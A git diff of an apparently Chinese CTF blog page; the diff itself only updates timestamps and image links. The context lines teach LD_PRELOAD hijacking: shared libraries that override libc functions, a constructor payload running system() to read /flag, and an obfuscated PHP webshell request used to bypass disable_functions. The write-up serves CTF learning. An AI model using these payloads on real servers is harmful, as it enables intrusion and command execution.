@@ -34,7 +34,7 @@
 <meta property="og:image" content="https://luokuang1.github.io/images/jiec5.png">
 <meta property="og:image" content="https://luokuang1.github.io/images/jiec6.png">
 <meta property="article:published_time" content="2024-08-16T11:05:33.000Z">
-<meta property="article:modified_time" content="2024-08-16T12:51:11.426Z">
+<meta property="article:modified_time" content="2025-02-19T14:59:39.308Z">
 <meta property="article:author" content="luokuang">
 <meta property="article:tag" content="知识点 ctf">
 <meta name="twitter:card" content="summary">
@@ -201,9 +201,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">Posted on</span>
-      
 
-      <time title="Created: 2024-08-16 19:05:33 / Modified: 20:51:11" itemprop="dateCreated datePublished" datetime="2024-08-16T19:05:33+08:00">2024-08-16</time>
+      <time title="Created: 2024-08-16 19:05:33" itemprop="dateCreated datePublished" datetime="2024-08-16T19:05:33+08:00">2024-08-16</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2025-02-19 22:59:39" itemprop="dateModified" datetime="2025-02-19T22:59:39+08:00">2025-02-19</time>
     </span>
 
   
@@ -227,7 +233,7 @@
 <blockquote>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc ./<span class="number">1234.</span>c -o <span class="number">1234</span> <span class="comment">//将1234.c编译为一个可执行文件1234</span></span><br></pre></td></tr></table></figure>
 </blockquote>
-<p><img src="/images/jiec1.png" width="95%" height="60%"></p>
+<p><img src="https://luokuang1.github.io/images/jiec1.png" width="95%" height="60%"></p>
 <p>可以看到编译成功了，现在就可以执行，应该不出所料为10个随机数，下面就可以开始实验</p>
 <blockquote>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC <span class="number">1111.</span>c -o <span class="number">1111.</span>so <span class="comment">//将1111.c编译为一个共享库</span></span><br></pre></td></tr></table></figure>
@@ -236,13 +242,13 @@
 <blockquote>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LD_PRELOAD=$PWD/<span class="number">1111.</span>so ./<span class="number">1234</span> <span class="comment">//这样就先当于在运行1234前动态加载1111.so，但下一次就不会了</span></span><br><span class="line">export LD_PRELOAD=$PWD/<span class="number">1111.</span>so <span class="comment">//这里就先当于设置了全局环境变量，对所有都有约束</span></span><br><span class="line">unset LD_PRELOAD  <span class="comment">//这个就可以恢复最初的</span></span><br></pre></td></tr></table></figure>
 </blockquote>
-<p><img src="/images/jiec2.png" width="95%" height="60%"></p>
+<p><img src="https://luokuang1.github.io/images/jiec2.png" width="95%" height="60%"></p>
 <p>这样就变为我们控制的值，相当于它加载的<strong>rand函数被调包了</strong>，调用成我们生成的1111.so中的rand函数，这样就可以实现控制</p>
 <p>这里可以提供一个命令看看其执行时用于打印程序或者库文件所依赖的共享库列表</p>
 <blockquote>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldd <span class="number">1234</span></span><br></pre></td></tr></table></figure>
 </blockquote>
-<p><img src="/images/jiec3.png" width="95%" height="60%"></p>
+<p><img src="https://luokuang1.github.io/images/jiec3.png" width="95%" height="60%"></p>
 <p>这里还有很多的例子，比如我们知道一个命令它会调用什么库，我们可以先进行拦截，最后在进行额外的操作这里也有一个实验，但是做法都一样,通过重写其中的一个函数来实现危险的方法调用</p>
 <p>首先先确定其调用的函数，这里是通过ls命令为例子，其它的命令也是一样，在ls命令中就存在一个比较特殊的函数strncmp</p>
 <blockquote>
@@ -258,13 +264,13 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getenv <span class="comment">//用于从环境变量中取字符串，即获取环境变量的值</span></span><br><span class="line">putenv <span class="comment">//用于改变或增加环境变量的内容。在C语言中，putenv函数接受一个格式为name=value的字符串，如果该环境变量已存在，则更新其值；如果不存在，则添加该环境变量。</span></span><br><span class="line">setenv <span class="comment">//是putenv的一个更安全的替代品，因为它允许指定是否覆盖已存在的环境变量，并且不会修改传入的字符串。</span></span><br><span class="line">unsetenv  <span class="comment">//用于删除指定的环境变量。</span></span><br></pre></td></tr></table></figure>
 </blockquote>
 <p>这里就可以在执行ls命令时输出hello i am haker!!!，当然在这里我们也可以来执行危险函数,只需修改payload里面的内容即可</p>
-<p><img src="/images/jiec4.png" width="95%" height="60%"></p>
+<p><img src="https://luokuang1.github.io/images/jiec4.png" width="95%" height="60%"></p>
 <p>这里还有一个用途，通过attribute来进行LD_PRELOAD劫持</p>
 <p>GCC 有个 C 语言扩展修饰符 attribute((constructor))，可以让由它修饰的函数在 main() 之前执行，一旦某些指令需要加载动态链接库时，就会立即执行它</p>
 <blockquote>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line">__attribute__ ((__constructor__)) <span class="type">void</span> <span class="title function_">preload</span> <span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;i am hacker!!\n&quot;</span>);  <span class="comment">//这里可以进行修改</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 </blockquote>
-<p><img src="/images/jiec5.png" width="95%" height="60%"></p>
+<p><img src="https://luokuang1.github.io/images/jiec5.png" width="95%" height="60%"></p>
 <p>可以看到所有的命令执行都触发了危险的函数</p>
 <p>最后就是通过LD_PRELOAD劫持来绕过Disable_Functions</p>
 <p>在有些时候就会出现，我们没有办法读取通过命令来执行读取flag的操作就可以试试LD_PRELOAD劫持来实现命令读取，具体也是一样，一般步骤都是一样的，但是需要执行 这个修改LD_PRELOAD的语句有点难，一般就是通过php文件包含来实现，通过php代码来实现这个操作</p>
@@ -303,7 +309,7 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span> &#123;</span><br><span class="line">        system(<span class="string">&quot;cat /flag &gt;&gt; /var/tmp/test.php&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;tail /flag &gt;&gt; /var/tmp/test.php&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/readflag &gt;&gt; /var/tmp/test.php&quot;</span>);</span><br><span class="line">        </span><br><span class="line">&#125;   </span><br><span class="line">__attribute__ ((__constructor__)) <span class="type">void</span> <span class="title function_">preload</span> <span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 </blockquote>
 <p>再通过kali将.c文件编译为.so文件进行上传即可</p>
-<p><img src="/images/jiec6.png" width="95%" height="60%"></p>
+<p><img src="https://luokuang1.github.io/images/jiec6.png" width="95%" height="60%"></p>
 <p>最后通过一句话木马来进行文件包含即可</p>
 <blockquote>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%<span class="number">8D</span>%8B)(~%D7%9A%<span class="number">89</span>%9E%<span class="number">93</span>%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%D6);</span><br><span class="line"><span class="number">1</span>=include(<span class="string">&quot;/var/tmp/shell1.php&quot;</span>);</span><br></pre></td></tr></table></figure>
